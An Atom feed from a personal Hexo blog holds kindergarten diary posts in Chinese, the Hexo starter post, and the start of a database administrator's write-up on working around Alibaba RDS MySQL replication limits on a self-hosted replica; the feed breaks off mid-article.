<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Amy and Booboo</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.toberoot.com/"/>
  <updated>2020-03-22T14:23:51.136Z</updated>
  <id>http://www.toberoot.com/</id>
  
  <author>
    <name>BoobooWei</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Hello World</title>
    <link href="http://www.toberoot.com/2020/03/22/booboo_others/hello-world/"/>
    <id>http://www.toberoot.com/2020/03/22/booboo_others/hello-world/</id>
    <published>2020-03-22T14:23:51.136Z</published>
    <updated>2020-03-22T14:23:51.136Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
      
    
    </summary>
    
    
      <category term="技术广角" scheme="http://www.toberoot.com/categories/%E6%8A%80%E6%9C%AF%E5%B9%BF%E8%A7%92/"/>
    
      <category term="Hexo" scheme="http://www.toberoot.com/categories/%E6%8A%80%E6%9C%AF%E5%B9%BF%E8%A7%92/Hexo/"/>
    
    
      <category term="hexo" scheme="http://www.toberoot.com/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>国庆前学洗手</title>
    <link href="http://www.toberoot.com/2018/09/30/amy_life/%E5%9B%BD%E5%BA%86%E5%89%8D%E5%AD%A6%E6%B4%97%E6%89%8B/"/>
    <id>http://www.toberoot.com/2018/09/30/amy_life/%E5%9B%BD%E5%BA%86%E5%89%8D%E5%AD%A6%E6%B4%97%E6%89%8B/</id>
    <published>2018-09-30T10:43:53.000Z</published>
    <updated>2020-03-22T08:31:38.472Z</updated>
    
    <content type="html"><![CDATA[<p>今天人少，我们坐小月亮，然后给他们每人用了免洗洗手液，洗小手，国庆节出去不要忘记带哦</p><a id="more"></a><p align="center"><embed src='http://player.youku.com/player.php/sid/XMzg0Mzk0NDI5Ng==/v.swf' allowFullScreen='true' quality='high' width='480' height='400' align='middle' allowScriptAccess='always' type='application/x-shockwave-flash'></embed></p><p><img src="%E5%9B%BD%E5%BA%86%E5%89%8D%E5%AD%A6%E6%B4%97%E6%89%8B/01.jpg" alt=""></p><p>君君老师:<br>他们让我发给你们😂</p><p>小慈的晚托班制作五星红旗</p><p align="center"><embed src='http://player.youku.com/player.php/sid/XMzg0Mzk0OTg4MA==/v.swf' allowFullScreen='true' quality='high' width='480' height='400' align='middle' allowScriptAccess='always' type='application/x-shockwave-flash'></embed></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天人少，我们坐小月亮，然后给他们每人用了免洗洗手液，洗小手，国庆节出去不要忘记带哦&lt;/p&gt;
    
    </summary>
    
    
      <category term="往昔追忆" scheme="http://www.toberoot.com/categories/%E5%BE%80%E6%98%94%E8%BF%BD%E5%BF%86/"/>
    
      <category term="小二班" scheme="http://www.toberoot.com/categories/%E5%BE%80%E6%98%94%E8%BF%BD%E5%BF%86/%E5%B0%8F%E4%BA%8C%E7%8F%AD/"/>
    
    
      <category term="宝宝成长" scheme="http://www.toberoot.com/tags/%E5%AE%9D%E5%AE%9D%E6%88%90%E9%95%BF/"/>
    
  </entry>
  
  <entry>
    <title>宝宝们上班啦</title>
    <link href="http://www.toberoot.com/2018/09/29/amy_life/%E5%AE%9D%E5%AE%9D%E4%BB%AC%E4%B8%8A%E7%8F%AD%E5%95%A6/"/>
    <id>http://www.toberoot.com/2018/09/29/amy_life/%E5%AE%9D%E5%AE%9D%E4%BB%AC%E4%B8%8A%E7%8F%AD%E5%95%A6/</id>
    <published>2018-09-29T10:43:41.000Z</published>
    <updated>2020-03-22T08:31:38.457Z</updated>
    
    <content type="html"><![CDATA[<p>君君老师:<br>最近我们孩子的角色游戏慢慢进入状态了，但也有几个孩子沉迷于积木游戏无法自拔，我们希望家长们在家里也可以和孩子们一起玩角色扮演游戏，和孩子多互动，也可以拓宽思路，可以做现实生活中不能做的，比如仙女啊，公主啊，小士兵等等</p><a id="more"></a><p><img src="%E5%AE%9D%E5%AE%9D%E4%BB%AC%E4%B8%8A%E7%8F%AD%E5%95%A6/01.jpg" alt=""></p><p><img src="%E5%AE%9D%E5%AE%9D%E4%BB%AC%E4%B8%8A%E7%8F%AD%E5%95%A6/02.jpg" alt="02"></p><p><img src="%E5%AE%9D%E5%AE%9D%E4%BB%AC%E4%B8%8A%E7%8F%AD%E5%95%A6/03.jpg" alt="03"></p><p><img src="%E5%AE%9D%E5%AE%9D%E4%BB%AC%E4%B8%8A%E7%8F%AD%E5%95%A6/04.jpg" alt="04"></p><p><img src="%E5%AE%9D%E5%AE%9D%E4%BB%AC%E4%B8%8A%E7%8F%AD%E5%95%A6/05.jpg" alt="05"></p><p><img src="%E5%AE%9D%E5%AE%9D%E4%BB%AC%E4%B8%8A%E7%8F%AD%E5%95%A6/06.jpg" alt="06"></p><p><img src="%E5%AE%9D%E5%AE%9D%E4%BB%AC%E4%B8%8A%E7%8F%AD%E5%95%A6/07.jpg" alt="07"></p><p><img src="%E5%AE%9D%E5%AE%9D%E4%BB%AC%E4%B8%8A%E7%8F%AD%E5%95%A6/08.jpg" alt="08"></p><p><img src="%E5%AE%9D%E5%AE%9D%E4%BB%AC%E4%B8%8A%E7%8F%AD%E5%95%A6/09.jpg" alt="09"></p><p><img src="%E5%AE%9D%E5%AE%9D%E4%BB%AC%E4%B8%8A%E7%8F%AD%E5%95%A6/10.jpg" alt="10"></p><p><img src="%E5%AE%9D%E5%AE%9D%E4%BB%AC%E4%B8%8A%E7%8F%AD%E5%95%A6/11.jpg" alt="11"></p><p><img src="%E5%AE%9D%E5%AE%9D%E4%BB%AC%E4%B8%8A%E7%8F%AD%E5%95%A6/12.jpg" alt="12"></p><p><img src="%E5%AE%9D%E5%AE%9D%E4%BB%AC%E4%B8%8A%E7%8F%AD%E5%95%A6/13.jpg" alt="13"></p><p>君君老师:<br>今天我们还认识了五星红旗，知道自己是一个中国人，我告诉他们过几天要给祖国妈妈过生日了，要休息七天，有孩子还反驳说不行，休息三天就够了，哈哈我还告诉他们祖国妈妈会请他们吃生日蛋糕的</p><p>午餐前还额外学了一首歌，送给我们的祖国妈妈</p><p><a href="https://music.163.com/#/song?id=498555737&market=baiduqk" target="_blank" rel="noopener">儿歌-祖国祖国我爱你</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;君君老师:&lt;br&gt;最近我们孩子的角色游戏慢慢进入状态了，但也有几个孩子沉迷于积木游戏无法自拔，我们希望家长们在家里也可以和孩子们一起玩角色扮演游戏，和孩子多互动，也可以拓宽思路，可以做现实生活中不能做的，比如仙女啊，公主啊，小士兵等等&lt;/p&gt;
    
    </summary>
    
    
      <category term="往昔追忆" scheme="http://www.toberoot.com/categories/%E5%BE%80%E6%98%94%E8%BF%BD%E5%BF%86/"/>
    
      <category term="小二班" scheme="http://www.toberoot.com/categories/%E5%BE%80%E6%98%94%E8%BF%BD%E5%BF%86/%E5%B0%8F%E4%BA%8C%E7%8F%AD/"/>
    
    
      <category term="宝宝成长" scheme="http://www.toberoot.com/tags/%E5%AE%9D%E5%AE%9D%E6%88%90%E9%95%BF/"/>
    
  </entry>
  
  <entry>
    <title>月饼烘培和小小搬运工</title>
    <link href="http://www.toberoot.com/2018/09/21/amy_life/%E6%9C%88%E9%A5%BC%E7%83%98%E5%9F%B9%E5%92%8C%E5%B0%8F%E5%B0%8F%E6%90%AC%E8%BF%90%E5%B7%A5/"/>
    <id>http://www.toberoot.com/2018/09/21/amy_life/%E6%9C%88%E9%A5%BC%E7%83%98%E5%9F%B9%E5%92%8C%E5%B0%8F%E5%B0%8F%E6%90%AC%E8%BF%90%E5%B7%A5/</id>
    <published>2018-09-21T12:25:51.000Z</published>
    <updated>2020-03-22T08:31:38.460Z</updated>
    
    <content type="html"><![CDATA[<p>中秋节快到了，老师带宝宝们一起做了月饼，拿去烤了，宝宝们还帮老师一起搬桌子，虽然结局差强人意，但是孩子们都很开心呢！</p><a id="more"></a><p align="center"><embed src='http://player.youku.com/player.php/sid/XMzg0Mzk0NDg5Ng==/v.swf' allowFullScreen='true' quality='high' width='480' height='400' align='middle' allowScriptAccess='always' type='application/x-shockwave-flash'></embed></p><p><img src="%E6%9C%88%E9%A5%BC%E7%83%98%E5%9F%B9%E5%92%8C%E5%B0%8F%E5%B0%8F%E6%90%AC%E8%BF%90%E5%B7%A5/01.jpg" alt=""></p><p><img src="%E6%9C%88%E9%A5%BC%E7%83%98%E5%9F%B9%E5%92%8C%E5%B0%8F%E5%B0%8F%E6%90%AC%E8%BF%90%E5%B7%A5/02.jpg" alt="02"></p><p><img src="%E6%9C%88%E9%A5%BC%E7%83%98%E5%9F%B9%E5%92%8C%E5%B0%8F%E5%B0%8F%E6%90%AC%E8%BF%90%E5%B7%A5/03.jpg" alt="03"></p><p><img src="%E6%9C%88%E9%A5%BC%E7%83%98%E5%9F%B9%E5%92%8C%E5%B0%8F%E5%B0%8F%E6%90%AC%E8%BF%90%E5%B7%A5/04.jpg" alt="04"></p><p><img src="%E6%9C%88%E9%A5%BC%E7%83%98%E5%9F%B9%E5%92%8C%E5%B0%8F%E5%B0%8F%E6%90%AC%E8%BF%90%E5%B7%A5/05.jpg" alt="05"></p><p><img src="%E6%9C%88%E9%A5%BC%E7%83%98%E5%9F%B9%E5%92%8C%E5%B0%8F%E5%B0%8F%E6%90%AC%E8%BF%90%E5%B7%A5/06.jpg" alt="06"></p><p><img src="%E6%9C%88%E9%A5%BC%E7%83%98%E5%9F%B9%E5%92%8C%E5%B0%8F%E5%B0%8F%E6%90%AC%E8%BF%90%E5%B7%A5/07.jpg" alt="07"></p><p><img src="%E6%9C%88%E9%A5%BC%E7%83%98%E5%9F%B9%E5%92%8C%E5%B0%8F%E5%B0%8F%E6%90%AC%E8%BF%90%E5%B7%A5/08.jpg" alt="08"></p><p><img src="%E6%9C%88%E9%A5%BC%E7%83%98%E5%9F%B9%E5%92%8C%E5%B0%8F%E5%B0%8F%E6%90%AC%E8%BF%90%E5%B7%A5/09.jpg" alt="09"></p><p><img src="%E6%9C%88%E9%A5%BC%E7%83%98%E5%9F%B9%E5%92%8C%E5%B0%8F%E5%B0%8F%E6%90%AC%E8%BF%90%E5%B7%A5/20.jpg" alt="20"></p><p><img src="%E6%9C%88%E9%A5%BC%E7%83%98%E5%9F%B9%E5%92%8C%E5%B0%8F%E5%B0%8F%E6%90%AC%E8%BF%90%E5%B7%A5/00.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;中秋节快到了，老师带宝宝们一起做了月饼，拿去烤了，宝宝们还帮老师一起搬桌子，虽然结局差强人意，但是孩子们都很开心呢！&lt;/p&gt;
    
    </summary>
    
    
      <category term="往昔追忆" scheme="http://www.toberoot.com/categories/%E5%BE%80%E6%98%94%E8%BF%BD%E5%BF%86/"/>
    
      <category term="小二班" scheme="http://www.toberoot.com/categories/%E5%BE%80%E6%98%94%E8%BF%BD%E5%BF%86/%E5%B0%8F%E4%BA%8C%E7%8F%AD/"/>
    
    
      <category term="宝宝成长" scheme="http://www.toberoot.com/tags/%E5%AE%9D%E5%AE%9D%E6%88%90%E9%95%BF/"/>
    
  </entry>
  
  <entry>
    <title>宝宝们开始漱口了</title>
    <link href="http://www.toberoot.com/2018/09/20/amy_life/%E5%AE%9D%E5%AE%9D%E4%BB%AC%E5%BC%80%E5%A7%8B%E6%BC%B1%E5%8F%A3%E4%BA%86/"/>
    <id>http://www.toberoot.com/2018/09/20/amy_life/%E5%AE%9D%E5%AE%9D%E4%BB%AC%E5%BC%80%E5%A7%8B%E6%BC%B1%E5%8F%A3%E4%BA%86/</id>
    <published>2018-09-20T12:08:51.000Z</published>
    <updated>2020-03-22T08:31:38.469Z</updated>
    
    <content type="html"><![CDATA[<p>摘要：今天开始我们让宝宝们开始漱口了，所以回家也要继续保持这个好习惯哦～</p><a id="more"></a><p>君君老师语录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">各位亲们，通过昨天的家长会，我们看到了家长回去的努力，今天午饭明显进步的宝宝有：@张瑾安妈妈 @操梓桐妈妈 @但颐宸妈妈 @何晟睿妈妈 @张恬觅妈妈 @严魏慈妈妈 @王晟宁妈妈 ，其他宝宝们继续加油哦～</span><br><span class="line"></span><br><span class="line">吃饭我们是和孩子们说：小汽车装装满，转弯送到山洞里，滑滑梯滑到肚子里，因为很多宝宝勺子不对着嘴巴，所以饭宝宝掉在桌子上都哭了。</span><br><span class="line"></span><br><span class="line">另外，今天我们练习了宝宝们排队走楼梯，大多数已经像模像样的了，上下楼梯靠右走了，今天的运动量有点大，所以估计宝贝们今晚又要早早睡觉了.</span><br></pre></td></tr></table></figure><p>今天开始我们让宝宝们开始漱口了，所以回家也要继续保持这个好习惯哦～</p><p><img src="%E5%AE%9D%E5%AE%9D%E4%BB%AC%E5%BC%80%E5%A7%8B%E6%BC%B1%E5%8F%A3%E4%BA%86/01.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;摘要：今天开始我们让宝宝们开始漱口了，所以回家也要继续保持这个好习惯哦～&lt;/p&gt;
    
    </summary>
    
    
      <category term="往昔追忆" scheme="http://www.toberoot.com/categories/%E5%BE%80%E6%98%94%E8%BF%BD%E5%BF%86/"/>
    
      <category term="小二班" scheme="http://www.toberoot.com/categories/%E5%BE%80%E6%98%94%E8%BF%BD%E5%BF%86/%E5%B0%8F%E4%BA%8C%E7%8F%AD/"/>
    
    
      <category term="宝宝成长" scheme="http://www.toberoot.com/tags/%E5%AE%9D%E5%AE%9D%E6%88%90%E9%95%BF/"/>
    
  </entry>
  
  <entry>
    <title>家长会</title>
    <link href="http://www.toberoot.com/2018/09/19/amy_life/%E5%AE%B6%E9%95%BF%E4%BC%9A/"/>
    <id>http://www.toberoot.com/2018/09/19/amy_life/%E5%AE%B6%E9%95%BF%E4%BC%9A/</id>
    <published>2018-09-19T11:40:55.000Z</published>
    <updated>2020-03-22T08:31:38.466Z</updated>
    
    <content type="html"><![CDATA[<p>摘要：幼儿园开学第10天，宝宝们逐渐稳定，融入这个大家庭，今天老师和我们分享宝宝们的幼儿园日常生活，以及我们对我们家长的一些建议，非常地用心。</p><a id="more"></a><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/001.jpg" alt=""></p><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/002.jpg" alt="002"></p><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/003.jpg" alt="003"></p><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/004.jpg" alt="004"></p><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/005.jpg" alt="005"></p><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/006.jpg" alt="006"></p><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/007.jpg" alt="007"></p><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/008.jpg" alt="008"></p><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/010.jpg" alt="010"></p><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/011.jpg" alt="011"></p><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/012.jpg" alt="012"></p><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/013.jpg" alt="013"></p><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/014.jpg" alt="014"></p><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/015.jpg" alt="015"></p><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/016.jpg" alt="016"></p><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/017.jpg" alt="017"></p><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/018.jpg" alt="018"></p><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/019.jpg" alt="019"></p><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/020.jpg" alt="020"></p><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/021.jpg" alt="021"></p><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/022.jpg" alt="022"></p><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/023.jpg" alt="023"></p><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/024.jpg" alt="024"></p><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/025.jpg" alt="025"></p><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/026.jpg" alt="026"></p><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/027.jpg" alt="027"></p><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/028.jpg" alt="028"></p><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/029.jpg" alt="029"></p><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/030.jpg" alt="030"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;摘要：幼儿园开学第10天，宝宝们逐渐稳定，融入这个大家庭，今天老师和我们分享宝宝们的幼儿园日常生活，以及我们对我们家长的一些建议，非常地用心。&lt;/p&gt;
    
    </summary>
    
    
      <category term="往昔追忆" scheme="http://www.toberoot.com/categories/%E5%BE%80%E6%98%94%E8%BF%BD%E5%BF%86/"/>
    
      <category term="小二班" scheme="http://www.toberoot.com/categories/%E5%BE%80%E6%98%94%E8%BF%BD%E5%BF%86/%E5%B0%8F%E4%BA%8C%E7%8F%AD/"/>
    
    
      <category term="宝宝成长" scheme="http://www.toberoot.com/tags/%E5%AE%9D%E5%AE%9D%E6%88%90%E9%95%BF/"/>
    
  </entry>
  
  <entry>
    <title>向月亮说晚安</title>
    <link href="http://www.toberoot.com/2018/09/10/amy_life/%E5%90%91%E6%9C%88%E4%BA%AE%E8%AF%B4%E6%99%9A%E5%AE%89/"/>
    <id>http://www.toberoot.com/2018/09/10/amy_life/%E5%90%91%E6%9C%88%E4%BA%AE%E8%AF%B4%E6%99%9A%E5%AE%89/</id>
    <published>2018-09-10T11:26:39.000Z</published>
    <updated>2020-03-22T08:31:38.463Z</updated>
    
    <content type="html"><![CDATA[<p>摘要：今天中午讲了一个关于「晚安，月亮」的睡前故事，最后猫头鹰对月亮说了晚安，大家今天睡前还可以和宝宝说哦，再加一些其他的动物宝宝</p><a id="more"></a><p><img src="%E5%90%91%E6%9C%88%E4%BA%AE%E8%AF%B4%E6%99%9A%E5%AE%89/01.jpg" alt=""></p><p><img src="%E5%90%91%E6%9C%88%E4%BA%AE%E8%AF%B4%E6%99%9A%E5%AE%89/02.jpg" alt="02"></p><p><img src="%E5%90%91%E6%9C%88%E4%BA%AE%E8%AF%B4%E6%99%9A%E5%AE%89/03.jpg" alt="03"></p><p><img src="%E5%90%91%E6%9C%88%E4%BA%AE%E8%AF%B4%E6%99%9A%E5%AE%89/04.jpg" alt="04"></p><p><img src="%E5%90%91%E6%9C%88%E4%BA%AE%E8%AF%B4%E6%99%9A%E5%AE%89/05.jpg" alt="05"></p><p><img src="%E5%90%91%E6%9C%88%E4%BA%AE%E8%AF%B4%E6%99%9A%E5%AE%89/06.jpg" alt="06"></p><p><img src="%E5%90%91%E6%9C%88%E4%BA%AE%E8%AF%B4%E6%99%9A%E5%AE%89/07.jpg" alt="07"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;摘要：今天中午讲了一个关于「晚安，月亮」的睡前故事，最后猫头鹰对月亮说了晚安，大家今天睡前还可以和宝宝说哦，再加一些其他的动物宝宝&lt;/p&gt;
    
    </summary>
    
    
      <category term="往昔追忆" scheme="http://www.toberoot.com/categories/%E5%BE%80%E6%98%94%E8%BF%BD%E5%BF%86/"/>
    
      <category term="小二班" scheme="http://www.toberoot.com/categories/%E5%BE%80%E6%98%94%E8%BF%BD%E5%BF%86/%E5%B0%8F%E4%BA%8C%E7%8F%AD/"/>
    
    
      <category term="宝宝成长" scheme="http://www.toberoot.com/tags/%E5%AE%9D%E5%AE%9D%E6%88%90%E9%95%BF/"/>
    
  </entry>
  
  <entry>
    <title>突破阿里限制实现&quot;RDS For MySQL 5.7到自建MySQL主从&quot;</title>
    <link href="http://www.toberoot.com/2018/08/22/booboo_others/rds-for-mysql-5-7%E5%88%B0%E8%87%AA%E5%BB%BAMySQL%E4%B8%BB%E4%BB%8E%E4%B9%8B%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3user%E8%A1%A8%E5%AE%9E%E7%8E%B0%E4%BB%8E%E5%BA%93%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E6%9B%B4%E6%94%B9%E5%8A%9F%E8%83%BD/"/>
    <id>http://www.toberoot.com/2018/08/22/booboo_others/rds-for-mysql-5-7%E5%88%B0%E8%87%AA%E5%BB%BAMySQL%E4%B8%BB%E4%BB%8E%E4%B9%8B%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3user%E8%A1%A8%E5%AE%9E%E7%8E%B0%E4%BB%8E%E5%BA%93%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E6%9B%B4%E6%94%B9%E5%8A%9F%E8%83%BD/</id>
    <published>2018-08-22T10:41:15.000Z</published>
    <updated>2020-03-22T08:32:42.581Z</updated>
    
    <content type="html"><![CDATA[<p>摘要: 阿里云的RDS For MySQL 5.7 到线下IDC机房的主从搭建相信看官方文档就可以完成，但是搭建之后却发现无法在本地进行认证权限的管理，这是为何？而阿里官方推荐使用DTS同步工具去实现，这个费用着实不少，又是否能够破解呢？本文详解如何暴力破解user表实现从库用户权限更改功能</p><a id="more"></a><h1 id="故事背景"><a href="#故事背景" class="headerlink" title="故事背景"></a>故事背景</h1><h2 id="数据库明细"><a href="#数据库明细" class="headerlink" title="数据库明细"></a>数据库明细</h2><p>说在前面：</p><ul><li>云上数据库： RDS For MySQL 5.7.20 普通用户权限</li><li>IDC数据库: MySQL 5.7.20 </li></ul><h2 id="故事情节"><a href="#故事情节" class="headerlink" title="故事情节"></a>故事情节</h2><p>现需要搭建RDS For MySQL 到线下IDC机房的主从，问题如下：</p><h3 id="同步系统表失败"><a href="#同步系统表失败" class="headerlink" title="同步系统表失败"></a>同步系统表失败</h3><h4 id="故障原因"><a href="#故障原因" class="headerlink" title="故障原因"></a>故障原因</h4><ul><li>RDS For MySQL 5.7.20 到自建MySQL 5.7.20主从同步异常的原因为RDS与MySQL官方版本使用的系统库不同</li><li>自建MySQL 5.7.20 无法同步主库RDS的系统表</li><li>自建MySQL 5.7.20 恢复RDS的全备份数据后无法执行授权语句,报错如下：</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR 1785 (HY000): Statement violates GTID consistency: Updates to non-transactional tables can only be done in either autocommitted statements or single-statement transactions, and never in the same statement as updates to transactional tables.</span><br></pre></td></tr></table></figure><ul><li>自建MySQL 5.7.20 恢复RDS的全备份数据后无法对系统表执行更新操作，报错如下：</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR 1064 (42000): Unknown trigger has an error in its body: 'Unknown system variable 'maintain_user_list''</span><br></pre></td></tr></table></figure><h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><ul><li>跳过系统表的同步</li></ul><hr><h3 id="从库添加认证授权失败"><a href="#从库添加认证授权失败" class="headerlink" title="从库添加认证授权失败"></a>从库添加认证授权失败</h3><p>RDS For MySQL 5.7.20 到自建MySQL 5.7.20 搭建主从同步架构:</p><ul><li>配置从库不同步RDS主库的系统表</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># skip rep</span><br><span class="line">replicate_wild_ignore_table&#x3D;mysql.%</span><br><span class="line">replicate_wild_ignore_table&#x3D;sys.%</span><br><span class="line">replicate_wild_ignore_table&#x3D;information_schema.%</span><br></pre></td></tr></table></figure><ul><li><strong>非系统库数据同步正常</strong></li><li>从库无法执行grant命令，即无法添加授权信息</li><li>从库无法对系统表mysql.user表执行insert操作</li><li>从库无法对系统表mysql.user表执行updat操作</li></ul><p>报错如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR 1064 (42000): Unknown trigger has an error in its body: 'Unknown system variable 'maintain_user_list''</span><br></pre></td></tr></table></figure><h4 id="失败原因"><a href="#失败原因" class="headerlink" title="失败原因"></a>失败原因</h4><p><strong>阿里工单答复</strong>：RDS 目前已经不支持 MYISAM 引擎创建了。所以如果是通过自建的replication 同步 就会有这个问题的，RDS 统一INNOB 引擎。<br>如果需求是从RDS 到自建数据库的同步关系，建议您使用DTS 做业务数据的同步。</p><h4 id="探索解决方法"><a href="#探索解决方法" class="headerlink" title="探索解决方法"></a>探索解决方法</h4><h5 id="从库尝试使用MySQL8-0-11"><a href="#从库尝试使用MySQL8-0-11" class="headerlink" title="从库尝试使用MySQL8.0.11"></a>从库尝试使用<code>MySQL8.0.11</code></h5><p>RDS For MySQL 5.7的备份文件 到线下自建MYSQL 8.0.11 无法恢复数据。因此该方法不可行。</p><h5 id="尝试临时关闭GTID模式"><a href="#尝试临时关闭GTID模式" class="headerlink" title="尝试临时关闭GTID模式"></a>尝试临时关闭GTID模式</h5><ol><li>临时停止slave同步</li><li>修改配置关闭gtid模式</li><li>重启服务</li></ol><p>对系统表mysql.user测试明细：</p><table><thead><tr><th>No.</th><th>测试项目</th><th>结果</th></tr></thead><tbody><tr><td>1</td><td>是否能够执行grant命令</td><td>×</td></tr><tr><td>2</td><td>是否能够执行update命令</td><td>×</td></tr><tr><td>3</td><td>是否能够执行insert命令</td><td>×</td></tr></tbody></table><p>该方法同样无法解决。</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 权限相关的一些表：</span></span><br><span class="line">SCHEMA_PRIVILEGES：提供了数据库的相关权限，这个表是内存表是从mysql.db中拉去出来的。</span><br><span class="line">TABLE_PRIVILEGES:提供的是表权限相关信息，信息是从 mysql.tables_priv 表中加载的</span><br><span class="line">COLUMN_PRIVILEGES ：这个表可以清楚就能看到表授权的用户的对象，那张表那个库以及授予的是什么权限，如果授权的时候加上with grant option的话，我们可以看得到PRIVILEGE_TYPE这个值必须是YES。</span><br><span class="line">USER_PRIVILEGES:提供的是表权限相关信息，信息是从 mysql.user 表中加载的</span><br><span class="line">通过表我们可以很清晰看得到MySQL授权的层次，SCHEMA，TABLE，COLUMN级别，当然这些都是基于用户来授予的</span><br></pre></td></tr></table></figure><p>从数据库用户权限管理的原理可以了解到管理用户的是<code>user</code>表，如果要更细致的权限还需要<code>db</code>表和<code>tables_priv</code>表。<em>（本文只从user表着手）</em></p><h3 id="步骤概览"><a href="#步骤概览" class="headerlink" 